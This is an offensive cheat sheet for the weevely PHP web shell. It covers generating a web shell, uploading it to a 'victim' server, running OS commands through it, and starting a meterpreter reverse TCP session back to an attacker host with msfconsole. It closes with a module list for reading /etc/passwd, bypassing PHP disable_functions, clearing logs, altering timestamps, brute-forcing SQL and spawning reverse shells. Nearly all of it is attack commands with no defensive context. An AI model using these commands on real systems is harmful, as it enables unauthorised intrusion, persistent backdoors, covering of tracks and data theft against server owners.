Quick webshell creation and usage
----------------------------------
```bash
# create web shell
# weevely generate <password> ./<outputfile.php>

weevely generate 1234 ./weevley.php

### upload file to victim

# From the command line run (get webshell) NOT IN BROWSER
# weevely http://xxx.xxx.xxx.xxx/<outputfile.php> <password>

weevely http://xxx.xxx.xxx.xxx/weevley.php 1234
# type ":help" for more commands
# use ctrl-c to exit

# run single command
# weevely http://xxx.xxx.xxx.xxx/<outputfile.php> <password> <os-command>

weevely http://xxx.xxx.xxx.xxx/weevley.php 1234 whoami
```


Get meterpreter shell
-------------------------
```bash
# On attacker run
msfconsole -x "use exploit/multi/handler; set PAYLOAD php/meterpreter/reverse_tcp; set LHOST <attacker.ip.address>; set PORT 1234; run"
# On Victim run
:backdoor_meterpreter -payload php/meterpreter/reverse_tcp -lhost <attacker.ip.address> -port 1234
```


Useful coammnds
------------------
```bash
:audit_filesystem             Audit the file system for weak permissions.                          
:audit_phpconf                Audit PHP configuration.                                             
:audit_disablefunctionbypass  Bypass disable_function restrictions with mod_cgi and .htaccess.     
:audit_suidsgid               Find files with SUID or SGID flags.                                  
:audit_etcpasswd              Read /etc/passwd with different techniques.                          
:shell_sh                     Execute shell commands.                                              
:shell_su                     Execute commands with su.                                            
:shell_php                    Execute PHP commands.                                                
:system_procs                 List running processes.                                              
:system_extensions            Collect PHP and webserver extension list.                            
:system_info                  Collect system information.                                          
:backdoor_meterpreter         Start a meterpreter session.                                         
:backdoor_reversetcp          Execute a reverse TCP shell.                                         
:backdoor_tcp                 Spawn a shell on a TCP port.                                         
:bruteforce_sql               Bruteforce SQL database.                                             
:file_gzip                    Compress or expand gzip files.                                       
:file_tar                     Compress or expand tar archives.                                     
:file_rm                      Remove remote file.                                                  
:file_webdownload             Download an URL.                                                     
:file_bzip2                   Compress or expand bzip2 files.                                      
:file_clearlog                Remove string from a file.                                           
:file_mount                   Mount remote filesystem using HTTPfs.                                
:file_upload2web              Upload file automatically to a web folder and get corresponding URL. 
:file_edit                    Edit remote file on a local editor.                                  
:file_upload                  Upload file to remote filesystem.                                    
:file_cd                      Change current working directory.                                    
:file_touch                   Change file timestamp.                                               
:file_find                    Find files with given names and attributes.                          
:file_zip                     Compress or expand zip files.                                        
:file_read                    Read remote file from the remote filesystem.                         
:file_cp                      Copy single file.                                                    
:file_download                Download file from remote filesystem.                                
:file_ls                      List directory content.                                              
:file_grep                    Print lines matching a pattern in multiple files.                    
:file_check                   Get attributes and permissions of a file.                            
:file_enum                    Check existence and permissions of a list of paths.                  
:sql_console                  Execute SQL query or run console.                                    
:sql_dump                     Multi dbms mysqldump replacement.                                    
:net_phpproxy                 Install PHP proxy on the target.                                     
:net_mail                     Send mail.                                                           
:net_proxy                    Run local proxy to pivot HTTP/HTTPS browsing through the target.     
:net_curl                     Perform a curl-like HTTP request.                                    
:net_ifconfig                 Get network interfaces addresses.                                    
:net_scan                     TCP Port scan.                                                       
```
